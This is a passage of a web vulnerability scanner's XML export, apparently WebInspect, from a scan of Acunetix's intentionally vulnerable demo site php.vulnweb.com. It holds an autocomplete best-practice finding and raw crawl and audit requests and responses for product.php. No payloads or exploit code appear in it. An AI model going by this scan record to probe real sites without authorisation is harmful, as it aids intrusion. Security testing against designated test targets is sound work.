String value = session.getAttribute(“myAttr”);  //Retrieve a value]]></SectionText></ReportSection></Issue><Issue id="16359a0f-96d4-4448-94e3-d386800eebdd"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="4190" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="DAA15E1D8773467EA7B95E6749B18163"><![CDATA[GET /product.php?pic=1 HTTP/1.1
Referer: http://php.vulnweb.com/listproducts.php?cat=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="DAA15E1D8773467EA7B95E6749B18163";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="b7b0d00a";
X-Request-Memo: ID="8ccc4896";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:51 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6428

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>The shore</h2><div class='story'><p><a href='showimage.php?file=./pictures/1.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/1.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $500</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='500'><input type='hidden' name='addcart' value='1'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="DAA15E1D8773467EA7B95E6749B18163"><Method>GET</Method><Path>/</Path><File>product</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>pic=1</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>pic</Name><Value>1</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/listproducts.php?cat=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="DAA15E1D8773467EA7B95E6749B18163";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="b7b0d00a";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="8ccc4896";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>The shore</h2><div class='story'><p><a href='showimage.php?file=./pictures/1.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/1.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $500</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='500'><input type='hidden' name='addcart' value='1'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:51 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6428</Value></Header></Headers><SetCookies /><Forms><Form><Action>cart.php</Action><Method>POST</Method><Name>f_addcart</Name><OnSubmit /><InputFields><InputField><Name>price</Name><Value>500</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>addcart</Name><Value>1</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name /><Value>add this picture to cart</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="3E84570C15A2CC2C6DE19B36371CA6CB"><URL>http://php.vulnweb.com:80/product.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="3E84570C15A2CC2C6DE19B36371CA6CB"><![CDATA[GET /product.php HTTP/1.1
Referer: http://php.vulnweb.com/product.php?pic=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="3E84570C15A2CC2C6DE19B36371CA6CB";PSID="DAA15E1D8773467EA7B95E6749B18163";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="91";tt="11";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="861566c8";
X-Request-Memo: ID="44c6bad7";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:37 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5056

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="3E84570C15A2CC2C6DE19B36371CA6CB"><Method>GET</Method><Path>/</Path><File>product</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/product.php?pic=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="3E84570C15A2CC2C6DE19B36371CA6CB";PSID="DAA15E1D8773467EA7B95E6749B18163";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="91";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="43";smi="0";sc="1";ID="861566c8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="44c6bad7";sc="1";tid="47";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
